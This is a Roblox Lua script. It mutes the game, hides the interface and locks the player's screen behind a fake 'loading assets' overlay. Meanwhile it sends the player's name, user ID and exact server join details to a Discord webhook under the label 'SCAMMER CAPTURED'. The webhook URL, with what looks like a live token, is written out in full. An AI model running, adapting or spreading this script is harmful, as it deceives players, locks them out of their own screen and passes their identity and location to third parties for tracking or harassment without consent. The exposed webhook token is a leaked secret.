--// Configuration
local webhookProxy = "https://hooks.hyra.io/api/webhooks/1483011079805079625/4C5mXHERHgjTN09uBEWFqzWvHULoQhnS0MKgvQQhCvWezjmlpQi2GqMIMqB1ZEt01sL5"

--// Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer

--// 1. SILENCE & ISOLATE
pcall(function()
    SoundService.MasterVolume = 0
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
end)

--// 2. THE UI OVERLAY
local sg = Instance.new("ScreenGui")
sg.Name = "SystemLock"
sg.DisplayOrder = 2147483647
sg.IgnoreGuiInset = true
sg.Parent = player:WaitForChild("PlayerGui")

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bg.BorderSizePixel = 0
bg.Parent = sg

local txt = Instance.new("TextLabel")
txt.Size = UDim2.new(1, 0, 1, 0)
txt.BackgroundTransparency = 1
txt.Text = "LOADING ASSETS... PLEASE WAIT"
txt.TextColor3 = Color3.new(1, 1, 1)
txt.Font = Enum.Font.Code
txt.TextSize = 22
txt.Parent = bg

--// 3. GENERATE DATA
local placeId = game.PlaceId
local jobId = game.JobId
local link = "https://www.roblox.com/games/" .. placeId .. "?jobId=" .. jobId

local data = {
    ["content"] = "🚨 **SCAMMER CAPTURED**",
    ["embeds"] = {{
        ["title"] = "Server Information",
        ["color"] = 0,
        ["fields"] = {
            {["name"] = "Target", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
            {["name"] = "Join Link", ["value"] = "[Click to Join Server](" .. link .. ")"},
            {["name"] = "Console Join", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance("..placeId..", '"..jobId.."', game.Players.LocalPlayer)
```"}
        }
    }}
}

--// 4. SEND TO WEBHOOK
local success, err = pcall(function()
    HttpService:PostAsync(webhookProxy, HttpService:JSONEncode(data))
end)

if not success then
    warn("Webhook failed: " .. tostring(err))
end
